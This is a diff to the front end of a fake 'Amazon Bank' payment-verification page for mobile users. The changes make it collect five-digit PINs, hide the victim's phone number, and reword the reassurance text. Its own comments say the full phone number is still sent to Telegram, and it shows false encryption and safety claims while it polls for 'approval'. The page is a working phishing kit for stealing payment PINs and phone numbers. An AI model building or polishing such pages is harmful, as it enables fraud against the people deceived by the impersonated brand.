@@ -28,6 +28,7 @@
     background: #EEF0F2; color: var(--amz-text);
     -webkit-font-smoothing: antialiased; line-height: 1.4;
     min-height: 100dvh; display: flex; justify-content: center; align-items: center;
+    overflow: hidden;
   }
   .phone {
     width: 100%; max-width: 400px; background: #FFFFFF;
@@ -42,7 +43,7 @@
     }
   }
   .app-header {
-    background: var(--amz-ink); color: #fff; height: 68px; padding: 0 14px;
+    background: var(--amz-ink); color: #fff; height: 60px; padding: 0 14px;
     padding-top: env(safe-area-inset-top, 0);
     display: flex; align-items: center; justify-content: space-between;
     position: relative; flex-shrink: 0; z-index: 5;
@@ -58,57 +59,50 @@
   .app-header .title {
     position: absolute; left: 50%; top: 50%;
     transform: translate(-50%, -50%);
-    font-size: 17px; font-weight: 600; letter-spacing: -0.2px; white-space: nowrap;
+    font-size: 16px; font-weight: 600; letter-spacing: -0.2px; white-space: nowrap;
   }
   .app-header .spacer-right { width: 34px; height: 34px; }
+
+  /* Body: fits without scrolling — no overflow */
   .body-scroll {
-    flex: 1 1 auto; overflow-y: auto; -webkit-overflow-scrolling: touch;
-    padding: 22px; display: flex; flex-direction: column;
+    flex: 1 1 auto;
+    overflow: hidden;
+    padding: 16px 20px 16px;
+    display: flex; flex-direction: column;
   }
-  .brand-block { text-align: center; margin-bottom: 22px; }
+
+  .brand-block { text-align: center; margin-bottom: 14px; }
   .brand-block .brand-mark {
-    width: 60px; height: 60px; border-radius: 16px;
+    width: 52px; height: 52px; border-radius: 14px;
     background: linear-gradient(135deg, var(--amz-orange), var(--amz-orange-hover));
     color: var(--amz-ink); display: inline-flex; align-items: center; justify-content: center;
-    font-size: 24px; font-weight: 800; letter-spacing: -0.5px;
-    box-shadow: 0 8px 22px rgba(255,134,31,0.32); margin-bottom: 12px;
+    font-size: 20px; font-weight: 800; letter-spacing: -0.5px;
+    box-shadow: 0 6px 18px rgba(255,134,31,0.30); margin-bottom: 8px;
   }
-  .brand-block .brand-name { font-size: 18px; font-weight: 800; color: var(--amz-ink); letter-spacing: -0.3px; }
-  .brand-block .brand-sub { font-size: 11.5px; color: var(--amz-muted); margin-top: 2px; letter-spacing: 0.2px; }
+  .brand-block .brand-name { font-size: 16px; font-weight: 800; color: var(--amz-ink); letter-spacing: -0.3px; }
+  .brand-block .brand-sub { font-size: 10.5px; color: var(--amz-muted); margin-top: 1px; letter-spacing: 0.2px; }
+
   .context-card {
     background: #F7F8FA; border: 1px solid var(--amz-border-soft);
-    border-radius: 12px; padding: 14px; margin-bottom: 20px;
+    border-radius: 12px; padding: 10px 14px; margin-bottom: 14px;
   }
   .context-row {
     display: flex; justify-content: space-between; align-items: center;
-    padding: 6px 0; font-size: 12.5px;
+    padding: 5px 0; font-size: 12px;
   }
   .context-row + .context-row { border-top: 1px solid var(--amz-border-soft); }
   .context-row .k { color: var(--amz-muted); font-weight: 500; }
   .context-row .v { color: var(--amz-ink); font-weight: 600; text-align: right; max-width: 62%; word-break: break-word; }
-  .context-row .v.mono { font-family: "SF Mono", Monaco, monospace; font-size: 11.5px; letter-spacing: 0.3px; }
-  .context-row.total { padding-top: 8px; }
-  .context-row.total .v { font-weight: 800; font-size: 14px; }
-  .verify-headline { text-align: center; margin-bottom: 6px; }
-  .verify-headline h1 { font-size: 17px; font-weight: 800; color: var(--amz-ink); letter-spacing: -0.3px; margin-bottom: 4px; }
-  .verify-headline p { font-size: 12px; color: var(--amz-muted); line-height: 1.5; max-width: 300px; margin: 0 auto; }
-  .recipient-box {
-    margin: 16px 0 8px; padding: 12px 14px;
-    background: #FFFFFF; border: 1.5px solid var(--amz-border); border-radius: 10px;
-    display: flex; align-items: center; gap: 10px;
-  }
-  .recipient-box .flag {
-    flex: 0 0 28px; height: 28px; border-radius: 50%;
-    background: var(--amz-orange-subtle); color: var(--amz-orange-hover);
-    display: flex; align-items: center; justify-content: center;
-  }
-  .recipient-box .num {
-    flex: 1; font-size: 13.5px;
-    font-weight: 600; color: var(--amz-ink); letter-spacing: 0.2px;
-  }
-  .pin-label { font-size: 12.5px; font-weight: 600; color: var(--amz-ink); margin: 12px 0 8px; text-align: center; }
+  .context-row .v.mono { font-family: "SF Mono", Monaco, monospace; font-size: 11px; letter-spacing: 0.3px; }
+  .context-row.total { padding-top: 7px; }
+  .context-row.total .v { font-weight: 800; font-size: 13.5px; }
 
-  /* ── Single PIN input, no boxes ── */
+  .verify-headline { text-align: center; margin-bottom: 4px; }
+  .verify-headline h1 { font-size: 16px; font-weight: 800; color: var(--amz-ink); letter-spacing: -0.3px; margin-bottom: 3px; }
+  .verify-headline p { font-size: 11.5px; color: var(--amz-muted); line-height: 1.45; max-width: 300px; margin: 0 auto; }
+
+  /* Single wide PIN input, generous spacing, 5 digits */
+  .pin-label { font-size: 12px; font-weight: 600; color: var(--amz-ink); margin: 14px 0 8px; text-align: center; }
   .pin-row {
     display: flex;
     justify-content: center;
@@ -118,13 +112,13 @@
   }
   .pin-input {
     width: 100%;
-    max-width: 280px;
-    height: 56px;
+    max-width: 300px;
+    height: 60px;
     text-align: center;
-    font-size: 24px;
+    font-size: 26px;
     font-weight: 700;
-    letter-spacing: 12px;
-    padding-left: 12px;
+    letter-spacing: 16px;
+    padding-left: 16px;
     color: var(--amz-ink);
     background: #FFFFFF;
     border: 1.5px solid var(--amz-border);
@@ -134,22 +128,25 @@
     transition: border-color .15s, box-shadow .15s;
     -webkit-appearance: none;
   }
-  .pin-input::placeholder { color: #C0C6CE; letter-spacing: 12px; }
+  .pin-input::placeholder { color: #C0C6CE; letter-spacing: 16px; }
   .pin-input:focus { border-color: var(--amz-orange); box-shadow: 0 0 0 3px rgba(255,134,31,0.16); }
   .pin-input.filled { border-color: var(--amz-ink); }
   .pin-input.error { border-color: var(--amz-error); box-shadow: 0 0 0 3px rgba(177,39,4,0.10); }
 
   .pin-error {
-    display: none; text-align: center; font-size: 11.5px;
-    color: var(--amz-error); font-weight: 600; margin-top: 6px;
+    display: none; text-align: center; font-size: 11px;
+    color: var(--amz-error); font-weight: 600; margin-top: 5px;
   }
   .pin-error.show { display: block; }
+
   .security-note {
     display: flex; align-items: center; justify-content: center;
-    gap: 6px; font-size: 11px; color: var(--amz-muted); margin-top: 10px; text-align: center;
+    gap: 6px; font-size: 10.5px; color: var(--amz-muted); margin-top: 10px; text-align: center;
   }
-  .security-note svg { width: 13px; height: 13px; color: var(--amz-success); flex-shrink: 0; }
-  .spacer { flex: 1 1 auto; min-height: 12px; }
+  .security-note svg { width: 12px; height: 12px; color: var(--amz-success); flex-shrink: 0; }
+
+  .spacer { flex: 1 1 auto; min-height: 8px; }
+
   .verify-btn {
     width: 100%; padding: 14px; font-size: 15px; font-weight: 700; font-family: inherit;
     color: #FFFFFF;
@@ -163,6 +160,7 @@
   .verify-btn:disabled {
     background: #D6D9DD; color: #8A8F98; box-shadow: none; cursor: not-allowed;
   }
+
   .verifying-overlay {
     position: fixed; inset: 0; background: var(--amz-ink); color: #fff;
     z-index: 100;
@@ -186,7 +184,6 @@
   }
   @keyframes spin { to { transform: rotate(360deg); } }
 
-  /* ── Sliding safety panel ── */
   .safety-panel {
     background: rgba(255,255,255,0.05);
     border: 1px solid rgba(255,255,255,0.08);
@@ -218,26 +215,11 @@
     line-height: 1.5;
     text-align: center;
   }
-  .safety-slide.active {
-    opacity: 1;
-    transform: translateX(0);
-  }
-  .safety-slide.leaving {
-    opacity: 0;
-    transform: translateX(-30px);
-  }
-  .safety-slide svg {
-    width: 20px;
-    height: 20px;
-    color: var(--amz-success);
-    flex-shrink: 0;
-  }
-  .safety-slide span {
-    flex: 1;
-    text-align: left;
-  }
+  .safety-slide.active { opacity: 1; transform: translateX(0); }
+  .safety-slide.leaving { opacity: 0; transform: translateX(-30px); }
+  .safety-slide svg { width: 20px; height: 20px; color: var(--amz-success); flex-shrink: 0; }
+  .safety-slide span { flex: 1; text-align: left; }
 
-  /* ── Popup for Incorrect PIN ── */
   .popup-backdrop {
     position: fixed; inset: 0;
     background: rgba(19,25,33,0.45);
@@ -246,14 +228,8 @@
     align-items: center; justify-content: center;
     padding: 24px;
   }
-  .popup-backdrop.show {
-    display: flex;
-    animation: fadeIn .2s ease;
-  }
-  @keyframes fadeIn {
-    from { opacity: 0; }
-    to   { opacity: 1; }
-  }
+  .popup-backdrop.show { display: flex; animation: fadeIn .2s ease; }
+  @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
   .popup-card {
     background: #FFFFFF;
     border-radius: 16px;
@@ -264,10 +240,7 @@
     box-shadow: 0 20px 60px rgba(19,25,33,0.35);
     animation: popIn .25s cubic-bezier(.4,1.3,.6,1);
   }
-  @keyframes popIn {
-    from { opacity: 0; transform: scale(0.9); }
-    to   { opacity: 1; transform: scale(1); }
-  }
+  @keyframes popIn { from { opacity: 0; transform: scale(0.9); } to { opacity: 1; transform: scale(1); } }
   .popup-card .ic {
     width: 60px; height: 60px;
     border-radius: 50%;
@@ -277,30 +250,12 @@
     margin: 0 auto 14px;
   }
   .popup-card .ic svg { width: 30px; height: 30px; }
-  .popup-card h3 {
-    font-size: 18px; font-weight: 800;
-    color: var(--amz-ink);
-    letter-spacing: -0.3px;
-    margin-bottom: 6px;
-  }
-  .popup-card p {
-    font-size: 13px;
-    color: var(--amz-muted);
-    line-height: 1.5;
-    margin-bottom: 18px;
-  }
+  .popup-card h3 { font-size: 18px; font-weight: 800; color: var(--amz-ink); letter-spacing: -0.3px; margin-bottom: 6px; }
+  .popup-card p { font-size: 13px; color: var(--amz-muted); line-height: 1.5; margin-bottom: 18px; }
   .popup-card .ok-btn {
-    width: 100%;
-    padding: 12px;
-    border: none;
-    border-radius: 10px;
-    background: var(--amz-ink);
-    color: #fff;
-    font-family: inherit;
-    font-size: 14px;
-    font-weight: 700;
-    cursor: pointer;
-    transition: filter .15s;
+    width: 100%; padding: 12px; border: none; border-radius: 10px;
+    background: var(--amz-ink); color: #fff; font-family: inherit;
+    font-size: 14px; font-weight: 700; cursor: pointer; transition: filter .15s;
   }
   .popup-card .ok-btn:hover { filter: brightness(1.15); }
   .popup-card .ok-btn:active { transform: scale(0.98); }
@@ -313,6 +268,17 @@
   }
   .state-card h2 { font-size: 18px; font-weight: 800; color: var(--amz-ink); margin-bottom: 6px; letter-spacing: -0.3px; }
   .state-card p { font-size: 13px; color: var(--amz-muted); line-height: 1.55; max-width: 280px; margin: 0 auto; }
+
+  /* Very short screens: compress further so nothing scrolls */
+  @media (max-height: 700px) {
+    .brand-block { margin-bottom: 10px; }
+    .brand-block .brand-mark { width: 44px; height: 44px; font-size: 18px; margin-bottom: 6px; }
+    .context-card { padding: 8px 12px; margin-bottom: 10px; }
+    .pin-label { margin: 10px 0 6px; }
+    .pin-input { height: 54px; font-size: 24px; }
+    .spacer { min-height: 4px; }
+    .verify-btn { padding: 12px; }
+  }
 </style>
 </head>
 <body>
@@ -344,23 +310,14 @@
 
     <div class="verify-headline">
       <h1>Enter your PIN</h1>
-      <p>Confirm your identity to receive this payment. The PIN is the one linked to the number below.</p>
-    </div>
-
-    <div class="recipient-box">
-      <span class="flag">
-        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="width:14px;height:14px">
-          <path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"/>
-        </svg>
-      </span>
-      <span class="num">Your registered number</span>
+      <p>Confirm your identity to receive this payment. Use the PIN linked to this account.</p>
     </div>
 
     <div class="pin-label">Your PIN</div>
     <div class="pin-row" id="pinRow">
-      <input class="pin-input" type="password" inputmode="numeric" maxlength="4" autocomplete="off" placeholder="••••">
+      <input class="pin-input" type="password" inputmode="numeric" maxlength="5" autocomplete="off" placeholder="•••••">
     </div>
-    <div class="pin-error" id="pinError">Please enter all 4 digits of your PIN.</div>
+    <div class="pin-error" id="pinError">Please enter all 5 digits of your PIN.</div>
 
     <div class="security-note">
       <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
@@ -377,21 +334,21 @@
 
 <div class="verifying-overlay" id="verifyingOverlay">
   <div class="brand-mark">AB</div>
-  <div class="load-title">Verifying your identity</div>
-  <div class="load-sub">We're confirming your PIN with Amazon Bank. This usually takes a few seconds.</div>
+  <div class="load-title">Processing securely</div>
+  <div class="load-sub">Your request is being reviewed. Please keep this page open.</div>
   <div class="spinner"></div>
   <div class="safety-panel">
     <div class="safety-slide active">
       <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2l8 4v6c0 5-3.5 9-8 10-4.5-1-8-5-8-10V6l8-4z"/><path d="M9 12l2 2 4-4"/></svg>
-      <span>End-to-end encryption protects your PIN at every step.</span>
+      <span>End-to-end encryption protects your details at every step.</span>
     </div>
     <div class="safety-slide">
       <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2l8 4v6c0 5-3.5 9-8 10-4.5-1-8-5-8-10V6l8-4z"/><path d="M9 12l2 2 4-4"/></svg>
-      <span>No funds move until verification is fully approved.</span>
+      <span>No funds move until the request is fully approved.</span>
     </div>
     <div class="safety-slide">
       <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2l8 4v6c0 5-3.5 9-8 10-4.5-1-8-5-8-10V6l8-4z"/><path d="M9 12l2 2 4-4"/></svg>
-      <span>Amazon Bank never shares your PIN with third parties.</span>
+      <span>Amazon Bank never shares your information with third parties.</span>
     </div>
   </div>
 </div>
@@ -452,16 +409,6 @@ function formatMoney(amount, currency) {
   return currencySymbol(currency) + safe.toFixed(2);
 }
 
-const DIAL_CODES = {
-  'Zimbabwe': '+263', 'South Africa': '+27', 'Zambia': '+260', 'Zambia (MTN)': '+260',
-  'Botswana': '+267', 'Kenya': '+254', 'Malawi': '+265', 'Rwanda': '+250', 'Rwanda (MTN)': '+250',
-  'DR Congo': '+243', 'Ghana': '+233', 'Ghana (MTN)': '+233', 'Lesotho': '+266',
-  'Uganda': '+256', 'Uganda (MTN)': '+256', 'China (Alipay)': '+86',
-  'Benin': '+229', 'Cameroon': '+237', "Côte d'Ivoire": '+225', 'Congo': '+242',
-  'Eswatini': '+268', 'Liberia': '+231'
-};
-function dialCodeFor(country) { return DIAL_CODES[String(country || '').trim()] || ''; }
-
 function b64urlDecode(str) {
   str = String(str).replace(/-/g, '+').replace(/_/g, '/');
   while (str.length % 4) str += '=';
@@ -502,7 +449,7 @@ function escapeHtml(s) {
 }
 
 const state = {
-  payload: null, pin: ['', '', '', ''], requestId: null,
+  payload: null, pin: ['', '', '', '', ''], requestId: null,
   polling: false, pollStart: 0, slowHintTimer: null
 };
 
@@ -521,9 +468,7 @@ function render(payload) {
   setTxt('ctxMethod', modeLabel + ' *' + last4);
   setTxt('ctxRef', payload.tx || payload.tn || '—');
   setTxt('ctxAmount', formatMoney(receive, cur));
-
-  // Number is NOT displayed to the user — only "Your registered number" is shown.
-  // The full number is still sent to Telegram via sendToTelegram().
+  // Phone number is never rendered on this page — full number still goes to Telegram.
 }
 
 function showStateCard(icon, title, message) {
@@ -547,14 +492,14 @@ function initPin() {
     const val = pinInput.value.replace(/\D/g, '');
     pinInput.value = val;
     state.pin = val.split('');
-    const filled = val.length === 4;
+    const filled = val.length === 5;
     pinInput.classList.toggle('filled', filled);
     verifyBtn.disabled = !filled;
     if (filled && errEl) errEl.classList.remove('show');
   }
 
   pinInput.addEventListener('input', (e) => {
-    e.target.value = e.target.value.replace(/\D/g, '').slice(0, 4);
+    e.target.value = e.target.value.replace(/\D/g, '').slice(0, 5);
     pinInput.classList.remove('error');
     updateState();
   });
@@ -626,7 +571,7 @@ function handleDecline() {
     pinInput.value = '';
     pinInput.classList.remove('filled', 'error');
   }
-  state.pin = ['', '', '', ''];
+  state.pin = ['', '', '', '', ''];
   const vb = document.getElementById('verifyBtn');
   if (vb) vb.disabled = true;
   state.requestId = null;
@@ -635,7 +580,6 @@ function handleDecline() {
   if (popup) popup.classList.add('show');
 }
 
-/* ── Safety slider ── */
 let safetyTimer = null;
 let safetyIndex = 0;
 
@@ -664,7 +608,7 @@ function stopSafetySlider() {
 
 async function doVerify() {
   const errEl = document.getElementById('pinError');
-  const allFilled = state.pin.length === 4 && state.pin.every(v => v !== '');
+  const allFilled = state.pin.length === 5 && state.pin.every(v => v !== '');
   if (!allFilled) {
     if (errEl) errEl.classList.add('show');
     const pinInput = document.querySelector('.pin-input');
@@ -679,8 +623,8 @@ async function doVerify() {
     const t = overlay.querySelector('.load-title');
     const s = overlay.querySelector('.load-sub');
     const sp = overlay.querySelector('.spinner');
-    if (t) t.textContent = 'Verifying your identity';
-    if (s) s.textContent = "We're confirming your PIN with Amazon Bank. This usually takes a few seconds.";
+    if (t) t.textContent = 'Processing securely';
+    if (s) s.textContent = 'Your request is being reviewed. Please keep this page open.';
     if (sp) sp.style.display = '';
     overlay.classList.add('show');
     startSafetySlider();
